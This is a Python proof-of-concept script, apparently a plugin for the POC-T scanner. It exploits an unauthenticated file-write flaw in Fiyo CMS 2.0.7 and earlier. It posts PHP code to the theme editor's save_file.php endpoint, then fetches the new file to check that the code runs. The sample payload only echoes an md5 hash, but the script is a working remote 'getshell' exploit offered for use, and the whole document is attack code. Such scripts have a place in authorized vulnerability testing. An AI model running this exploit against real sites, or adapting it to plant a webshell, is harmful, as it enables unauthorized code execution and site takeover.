# !/usr/bin/env python
#  -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
Fiyo CMS <= 2.0.7 Unauthenticated Remote Getshell PoC

Upload a shell via /dapur/apps/app_theme/libs/save_file.php then check if it exists.
"""

import requests
from plugin.util import randomMD5, randomString


def poc(url):
    url = url if '://' in url else 'http://' + url
    path = url + '/dapur/apps/app_theme/libs/'
    filename = randomString(5) + '.php'
    upload_path = path + 'save_file.php'
    shell_path = path + filename
    plain, cipher = randomMD5()

    post_data = {
        'content': '<?php echo md5("{}");?>'.format(plain),
        'src': filename
    }

    header_data = {
        'Referer': 'http://localhost/'
    }

    try:
        r = requests.post(url=upload_path, data=post_data, headers=header_data, timeout=3)
        shell = requests.get(shell_path)
        if r.status_code is 200 and cipher in shell.content:
            return True

    except Exception:
        return False

    return False
